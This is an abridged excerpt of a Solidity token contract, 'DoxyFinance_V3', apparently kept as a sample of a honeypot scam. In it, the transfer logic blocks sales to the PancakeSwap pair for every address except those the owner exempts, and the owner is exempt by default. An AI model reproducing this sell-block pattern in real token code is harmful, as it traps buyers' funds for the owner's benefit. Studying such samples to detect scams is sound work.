...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    mapping(address => bool) internal _isExcludedFromSell;
    ...
    function _transfer(
        ...
        if (!_isExcludedFromSell[sender] && recipient == pancakePair) {
...
contract DoxyFinance_V3 is ERC20, Ownable {
    ...
    constructor() ERC20("Doxy Finance", "DOXY_V3") {
        ...
        _isExcludedFromSell[owner()] = true ; 
        _isExcludedFromFee[address(this)] = true; 
    ...
    function excludeFromSell(address account) public onlyOwner {
        _isExcludedFromSell[account] = true;
    }

    function includeInSell(address account) public onlyOwner {
        _isExcludedFromSell[account] = false;
    }
    ...
    function isExcludedFromSell(address account) public view returns (bool) {
        return _isExcludedFromSell[account];
    }
